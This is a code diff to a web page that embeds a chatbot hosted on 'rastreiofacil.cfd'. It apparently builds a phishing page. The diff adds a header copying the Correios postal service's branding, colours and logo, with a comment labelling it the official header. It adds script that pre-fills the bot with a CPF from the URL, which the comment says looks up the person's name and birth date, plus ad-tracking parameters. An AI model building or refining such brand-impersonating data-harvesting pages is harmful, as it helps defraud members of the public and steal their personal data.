@@ -32,11 +32,32 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         typebot-standard:defined ~ #loader { display: none; }
-        typebot-standard { display: block; width: 100%; height: 100vh; height: 100dvh; }
+        typebot-standard { display: block; width: 100%; height: calc(100vh - 54px); height: calc(100dvh - 54px); }
+        /* header oficial dos Correios */
+        #correios-header {
+            position: sticky; top: 0; left: 0; width: 100%; height: 54px;
+            background: #00478F; display: flex; align-items: center; gap: 10px;
+            padding: 0 16px; z-index: 10; box-shadow: 0 2px 6px rgba(0,0,0,.18);
+        }
+        #correios-header .logo { width: 34px; height: 34px; flex: none; }
+        #correios-header .wm {
+            color: #fff; font-weight: 800; font-size: 1.4rem; letter-spacing: .01em;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        #correios-header .wm b { color: #FFD400; }
+        #loader { top: 54px; }
     </style>
 </head>
 
 <body>
+    <header id="correios-header">
+        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" aria-label="Correios">
+            <circle cx="50" cy="50" r="46" fill="#FFD400"/>
+            <path d="M28 42 Q50 26 72 42 L72 60 Q50 74 28 60 Z" fill="#00478F"/>
+            <circle cx="50" cy="50" r="7" fill="#FFD400"/>
+        </svg>
+        <span class="wm">Correios</span>
+    </header>
     <typebot-standard id="typebot-embed"></typebot-standard>
 
     <div id="loader">
@@ -48,9 +69,17 @@
     <script type="module">
         import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.10.2/dist/web.js';
 
+        // dados integrados: pré-preenche o flow com o que veio da consulta/anúncio
+        // (cpf → puxa nome/nascimento automático; + params de tracking do Google)
+        var _p = new URLSearchParams(location.search);
+        var _vars = {};
+        ['cpf','gclid','gbraid','wbraid','ref_id','pos','net','loc','int','disp','cpc','kw','rdn','mtx','plc','cr','domain']
+            .forEach(function (k) { var v = _p.get(k); if (v) _vars[k] = v; });
+
         Typebot.initStandard({
             typebot: 'crra',
-            apiHost: 'https://chat.rastreiofacil.cfd'
+            apiHost: 'https://chat.rastreiofacil.cfd',
+            prefilledVariables: _vars
         });
     </script>
 </body>
